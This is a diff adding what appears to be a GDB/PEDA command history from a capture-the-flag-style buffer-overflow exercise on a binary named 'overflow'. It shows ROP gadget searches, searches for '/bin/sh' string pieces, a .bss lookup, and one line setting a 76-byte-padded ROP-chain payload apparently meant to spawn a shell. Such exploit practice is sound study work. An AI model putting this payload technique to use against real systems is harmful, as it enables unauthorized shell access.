@@ -1,0 +1,92 @@
+fin sh
+b*main
+r
+find sh
+find sh binary
+file overflow
+cler
+clear
+dumprop binary
+ropsearch binary
+b*main
+r
+ropsearch binary
+ropsearch
+ropsearch ""
+ropsearch "pop"
+ropsearch ""
+ropsearch binary1
+q
+clear
+b*main
+r
+clear
+dumprop
+ropsearch "" 
+clear
+find /b
+p strcpy
+checksec
+q
+p bss
+info address __bss_start 
+q
+q
+find "/b" binary
+b*main
+r
+find "/b" binary
+find "in/" binary
+find "sh" binary
+ropsearch "" binary
+b*main
+r
+ropsearch "" binary
+ropsearch "" binary | grep pop
+ropsearch "" binary 
+set arg $(python -c 'print "A"*76 + "\x60\x83\x04\x08" + "\x2c\xa0\x04\x08" + "\x9e\x85\x04\x08" + "\x50\x83\x04\x08" + "\x2c\xa0\x04\x08" + "\x2c\xa0\x04\x08" + "\x29\x95\x04\x08"  + "\x50\x83\x04\x08" + "\x50\x83\x04\x08" + "\x2c\xa0\x04\x08" + "\x96\x86\x04\x08"+ "\x80\x83\x04\x08" + "JUNK" + "\x2c\xa0\x04\x08"')
+b*main
+r
+ni
+q
+file overflow
+find /b binary
+b*main 
+r
+find /b binary
+find in/ binary
+find sh binary
+q
+file overflow
+info addr __bss_start 
+zdq
+q
+q
+q
+clear
+ls
+clear
+q
+b*main
+r
+ropsearch "" binaru
+ropsearch "" binary
+clear
+clear
+ls
+find "/b" binary
+find "in/" binary
+find "sh" binary
+ropsearch "" binary
+dd
+q
+b*main
+r
+celar
+ls
+ropsearch "" binary
+q
+clear
+ls
+clear
+q
